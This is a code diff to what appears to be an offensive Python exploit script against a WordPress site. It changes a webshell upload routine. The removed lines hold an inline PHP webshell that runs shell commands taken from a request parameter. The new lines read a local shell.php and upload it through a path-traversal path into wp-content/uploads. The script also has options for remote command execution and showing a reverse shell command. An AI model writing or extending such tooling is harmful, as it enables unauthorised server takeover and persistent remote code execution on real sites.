@@ -68,12 +68,19 @@ def exploit(target_url, file_to_read):
         print("[-] Target is not vulnerable or readme.txt not accessible.")
         return False
 
-def upload_webshell(target_url):
+def upload_webshell(target_url, shell_filepath):
     print("[*] Attempting to upload WebShell...")
 
-    # 构造 PHP WebShell
-    webshell_filename = ''.join(random.choices(string.ascii_lowercase, k=6)) + ".php"
-    payload = "<?php if(isset($_REQUEST['cmd'])){echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>'; } ?>"
+    # 读取本地 shell.php 文件内容
+    if not os.path.exists(shell_filepath):
+        print(f"[-] File {shell_filepath} does not exist.")
+        return None
+
+    with open(shell_filepath, "r") as shell_file:
+        payload = shell_file.read()
+
+    # 使用 shell.php 上传
+    webshell_filename = os.path.basename(shell_filepath)
     upload_path = f"../../../../../../../../wp-content/uploads/{webshell_filename}"
 
     exploit_url = build_exploit_url(target_url, upload_path)
@@ -144,6 +151,7 @@ def main():
     parser.add_argument("-c", "--cmd", help="Command to execute via WebShell")
     parser.add_argument("-r", "--reverse", nargs=2, metavar=('IP', 'PORT'), help="Show reverse shell command (no exec)")
     parser.add_argument("--path", help="WebShell path to check or use")
+    parser.add_argument("--shell", required=True, help="Path to local WebShell (e.g., /path/to/shell.php)")  # 添加 shell 参数
     args = parser.parse_args()
 
     target_url = args.url.rstrip("/")
@@ -157,7 +165,7 @@ def main():
 
     elif args.mode == "upload":
         print("[*] Uploading WebShell...")
-        shell = upload_webshell(target_url)
+        shell = upload_webshell(target_url, args.shell)  # 上传本地 shell.php
         if shell:
             check_webshell(shell)
 
